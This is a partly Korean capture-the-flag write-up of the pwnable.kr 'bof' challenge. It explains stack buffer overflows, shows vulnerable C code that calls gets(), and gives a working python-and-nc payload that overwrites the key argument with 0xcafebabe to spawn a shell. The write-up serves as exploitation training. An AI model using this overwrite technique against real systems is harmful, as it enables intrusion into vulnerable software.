# bof

### Problem
```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

### Background Knowledge
* [Buffer overflow - Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow)
	- In information security and programming, a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.
	- Exploitation
		+ Stack-based exploitation
		+ Heap-based exploitation
* [Stack buffer overflow - Wikipedia](https://en.wikipedia.org/wiki/Stack_buffer_overflow)
	- 스택의 리턴 어드레스를 더렵혀서 원하는 구문을 실행시킨다.
	- 특정 위치에 원하는 값을 덮어씌워 원하는 대로 프로그램의 흐름을 바꾸는 것이다.
* [Function prologue and epilogue - Wikipedia](https://en.wikipedia.org/wiki/Function_prologue)
	- 함수 호출시 스택에 돌아올 주소를 저장하고, 스택 프레임을 생성한다.
	- 함수 종료시 스택 프레임을 제거하고 호출한 주소로 복귀한다.
	
### Inspection
```
$ nc pwnable.kr 9000

overflow me : 
Nah..

```
* `bof`가 바로 실행된다.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);       // smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
* [`bof.c`](./bof.c)
	- `main()`에서 `func(0xdeadbeef)`를 호출한다.
	- `func(0xdeadbeef)`
		+ `void func(int key)`
		+ `char overflowme[32];`
		+ `gets(overflowme);`
		+ `key == 0xcafebabe`이면 쉘이 뜬다.
	- [`gets()`](https://linux.die.net/man/3/gets)
		+ It reads a line from stdin into the buffer pointed to by `s` until either a terminating `newline` or `EOF`, which it replaces with a null byte (`aq\0aq`). **No check for buffer overrun is performed**.
		+ 글자 수를 정하지 않고 읽기 때문에, Buffer overflow에 취약하다.

* `bof`의 대략적인 스택 구조. 스택은 높은 주소에서 낮은 주소로 증가한다.
	
| Stack | Bytes |
|:---:|:--:|
| `key` | `4` |
| `overflowme` | `32` |

### Trial and error
* 막연히 `32 bytes` 이상의 입력을 넣으면 `key`를 변경할 수 있겠다는 생각을 했으나, 실제로 그렇지 않다.
* `key`는 `overflowme` 위에 있기 때문에, `overflowme`에서 오버플로우해도 더 높은 주소(더 밑)로 가기 때문에 `key`를 건들 수 없다.
	- `key`말고 다른 걸 건드리면 되지 않는가!
* 이는 Stack buffer overflow을 제대로 공부하지 않아서 실수하는 것이라고 생각했다.
* 삽질 중 [@ddddhkim](https://github.com/ddddhkim)이 빌려준 책 중 하나인 [윈도우 시스템 해킹 가이드 : 버그헌팅과 익스플로잇](http://hyunmini.tistory.com/77)에서 나오는 함수 호출과 리턴에 관한 내용이 불현듯 생각났다.
	- 각 함수는 호출된 후 필요한 만큼 메모리를 받아 사용하고, 함수가 종료된 후에는 메모리를 반환하고 종료된다.
	- 함수마다의 별도 스택공간을 스택 프레임이라고 부른다.
	- 함수 호출시 스택에 돌아올 주소를 저장하고, 스택 프레임을 생성한다. -> 함수 프롤로그
	- 함수 종료시 스택 프레임을 제거하고 호출한 주소로 복귀한다. -> 함수 에필로그
* 원하는 구문 실행.
	- `gets(overflowme)`에서 overflow을 일으켜서 스택 프레임의 복귀 주소를 원하는 구문이 있는(`system("/bin/sh");`) 주소로 더럽힌 다음, 함수 에필로그 과정을 따라가서 더럽힌 원하는 주소로 이동하여 원하는 구문을 실행시킨다.
	- 64bit ELF로 컴파일하여 해당 파일에서 원하는 구문의 주소값을 구한 다음 `1111111122222222333333334444444455555555<@`을 입력했더니 성공했었다.
	- 하지만 이는 컴파일때마다 구문의 주소값이 매번 바뀌어서 실패한 것과 다름없다.
	- 사이트에서 직접 받아온 파일은 실행 퍼미션을 줘도 디버깅이 잘 되지 않는다...
* 조건문을 만족시켜버려!
	- `func()`의 매개변수인 `key`에는 `0xdeadbeef`가 들어있다. 그리고 이것은 스택 상에 존재한다.
	- 코드 상에 있는 `0xcafebabe`는 변경할 수 없다.
	- 따라서 스택에서 `0xdeadbeef`가 있는 곳을 찾아본다.
	- `gdb`에서 `x/40xw $esp`를 치면 `0xdeadbeef`가 `overflowme[]`에서 `52 bytes` 정도 떨어져 있다는 것을 알 수 있다.
	- 이를 이용해서 뚫을 수 있다.
	- gdb에서 `run <<< $(python -c 'print "X"*52 + "\xbe\xba\xfe\xca"')` 하고 `n`좀 먹여주면 쉘이 실행되는 것을 확인할 수 있다.
	- 근데 `python -c 'print "X"*52 + "\xbe\xba\xfe\xca"' | nc pwnable.kr 9000`은 그냥 종료된다...
	- [파이썬(python)을 사용하여 프로그램에 입력값 넘겨주기](http://kaspyx.tistory.com/77)를 참고하여 `(python -c 'print "X"*52 + "\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000`은 가능한 것을 알아냈다.
	
### Solution
* `(python -c 'print "X"*52 + "\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000`

### Review
* 알게 된 것.
	- 스택 버퍼 오버플로우는 특정 위치에 원하는 값을 덮어씌워 원하는 대로 프로그램의 흐름을 바꾸는 것이다.
	- 함수 호출/리턴 과정에 스택 프레임을 생성/제거하는 프롤로그/에필로그가 존재한다.
	- gdb에서 breakpoint 설정, disassemble, 메모리 확인(`x/40xw $esp`) 등을 다룰 수 있게 되었다. [Debugging with GDB: Memory](https://sourceware.org/gdb/onlinedocs/gdb/Memory.html)
	- gdb 플러그인 pwndbg, peda 등을 알게 되었다.
	- [파이썬(python)을 사용하여 프로그램에 입력값 넘겨주기](http://kaspyx.tistory.com/77)
* 궁금한 것.
	- 조건문 일치 말고 원하는 구문을 실행하는 방법도 가능할까?
		+ `0xdeadbeef`가 있는 곳에서 `4`?`8`?`bytes`정도 이전의 위치가 `RET` 주소인 것 같아서 이를 덮어씌워보았다.
		+ `(python -c 'print "X"*48 + "\x5d\x06\x00\x00"';cat) | nc pwnable.kr 9000`
		+ 안된다...